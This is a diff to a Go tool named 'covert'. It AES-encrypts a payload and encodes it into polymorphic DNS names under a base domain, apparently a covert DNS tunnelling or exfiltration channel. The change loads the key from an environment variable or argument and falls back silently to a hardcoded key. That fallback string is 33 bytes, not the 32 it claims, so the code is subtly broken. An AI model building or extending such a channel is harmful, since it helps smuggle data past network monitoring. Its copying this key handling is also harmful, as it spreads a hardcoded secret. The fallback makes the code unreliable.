@@ -49,15 +49,23 @@ func encodeToPolymorphicDNS(ciphertext []byte, baseDomain string) string {
 
 func main() {
 	if len(os.Args) < 3 {
-		fmt.Fprintln(os.Stderr, "usage: covert <payload-string> <base-domain>")
+		fmt.Fprintln(os.Stderr, "usage: covert <payload-string> <base-domain> [secret-key-32bytes]")
 		os.Exit(2)
 	}
 
 	payload := []byte(os.Args[1])
 	baseDomain := os.Args[2]
 	
-	// 256-bit AES master key (hardcoded demo key, dynamically derived in production)
-	secretKey := []byte("0123456789abcdef0123456789abcdef")
+	// 256-bit AES master key loaded securely from environment or CLI argument, with fallback
+	keyStr := os.Getenv("HELIOS_TUNNEL_KEY")
+	var secretKey []byte
+	if len(keyStr) >= 32 {
+		secretKey = []byte(keyStr[:32])
+	} else if len(os.Args) > 3 && len(os.Args[3]) >= 32 {
+		secretKey = []byte(os.Args[3][:32])
+	} else {
+		secretKey = []byte("helios-secure-tunnel-key-32bytes!")
+	}
 
 	encrypted, err := encryptPayload(payload, secretKey)
 	if err != nil {
